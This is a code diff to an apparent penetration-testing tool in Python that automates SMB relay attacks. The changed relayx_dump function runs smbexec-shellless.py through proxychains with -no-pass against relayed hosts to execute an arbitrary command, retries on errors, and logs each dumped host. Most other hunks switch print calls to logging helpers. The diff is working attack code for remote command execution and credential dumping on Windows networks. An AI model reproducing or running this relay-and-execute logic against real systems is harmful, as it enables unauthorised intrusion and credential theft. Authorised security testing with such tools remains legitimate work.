@@ -1658,7 +1658,7 @@ def auto_parse():
                             printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
                     except Exception as e:
                         printnlog(str(e))
-                print("")
+                printnlog("")
             else:
                 printnlog('{} There are no creds to check'.format(red_minus))
 
@@ -1760,7 +1760,7 @@ def config_check():
         thread1.join()
         alt_exec_exit()
 
-    printnlog('\n{}[{}Config looks good{}]{}'.format(color_BLU, color_reset, color_BLU, color_reset))
+    printnlog('\n{}[{}Config looks good{}]{}\n'.format(color_BLU, color_reset, color_BLU, color_reset))
 
 def get_size(path):
     size = os.path.getsize(path)
@@ -1826,22 +1826,32 @@ def relayx_dump(reaper_command):
                 relayx_dat = item.replace(']', '').split(',')
                 if relayx_dat[3] == 'TRUE':
                     if relayx_dat[1] not in dumped_ips: # make sure we dont dump ips we have already dumped
-                        dumped_ips.append(relayx_dat[1])
-                        printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        printnlog('{}[+]{} Attacking {} as {}'.format(color_BLU, color_reset, relayx_dat[1], relayx_dat[2]))
+
+                        if logging.getLogger().level == logging.DEBUG: # if debug is enabled print the command else just log it
+                            printnlog('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        else:
+                            lognoprint('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+                        # run the command
                         data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+
                         while data_out.find('STATUS_OBJECT_NAME_NOT_FOUND') != -1: # this should work if we get a statys_object_name_not_found error to just rerun smbexec until it works
                             data_out = subprocess.getoutput('proxychains python3 {}/smbexec-shellless.py {}@{} -silent -no-pass \'{}\''.format(cwd, relayx_dat[2], relayx_dat[1], reaper_command))
+
                         if logging.getLogger().level == logging.DEBUG: # if were debugging print the output of smbexec-shellless
                             printnlog(data_out)
                         else: # otherwise just log it to the outputfile
                             lognoprint(data_out)
+
+                        printnlog('{}[+]{} {}: Completed'.format(color_BLU, color_reset, relayx_dat[1]))
+
                         if data_out.find('STATUS_ACCESS_DENIED') == -1 and data_out.find('STATUS_LOGON_TYPE_NOT_GRANTED') == -1 and data_out.find('Connection refused') == -1: # make sure it ran right before adding it to dumped ips
+                            dumped_ips.append(relayx_dat[1]) # add the dumped host to the dumped_ips to prevent it from being run again
                             with open('{}/hist'.format(cwd), 'a') as f: # keep a log of what ips have been dumped
                                 f.write(str(relayx_dat[1]) + '\n')
                                 f.close()
-
         else:
-            print('No Relays Available!')
+            printnlog('No Relays Available!')
 
 def alt_exec(relayx, reaper_command):
     thread1 = threading.Thread(target=alt_exec_newfile_printer) # starts our thread to print new files
@@ -1856,6 +1866,9 @@ def alt_exec(relayx, reaper_command):
             alt_exec_exit()
         config_check()
         relayx_dump(reaper_command)
+        os.system('touch {}/exit'.format(cwd))
+        thread1.join()
+        alt_exec_exit()
 
     yes = input('Press enter to exit \n')
     os.system('touch {}/exit'.format(cwd))
@@ -2078,20 +2091,20 @@ def apt_package_chk():
         if cache['samba'].is_installed:
             pass
         else:
-            print(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
+            printnlog(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
             errors = True
     except ValueError:
-        print(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
+        printnlog(color_RED + '[!] ERROR: samba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install samba -y')
         errors = True
 
     try:
         if cache['mono-complete'].is_installed:
             pass
         else:
-            print(color_RED + '[!] ERROR: mono-complete is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
+            printnlog(color_RED + '[!] ERROR: mono-complete is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
             errors = True
     except ValueError:
-        print(color_RED + '[!] ERROR: samono-completemba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
+        printnlog(color_RED + '[!] ERROR: samono-completemba is not installed ' + color_reset + '\n please install the dependecy with sudo apt-get install mono-complete -y')
         errors = True
 
     if errors:
@@ -2282,7 +2295,7 @@ if __name__ == '__main__':
                 sys.exit(0)
         else:
             # print local interfaces and ips
-            print('')
+            printnlog('')
             ifaces = ni.interfaces()
             for face in ifaces:
                 try:  # check to see if the interface has an ip
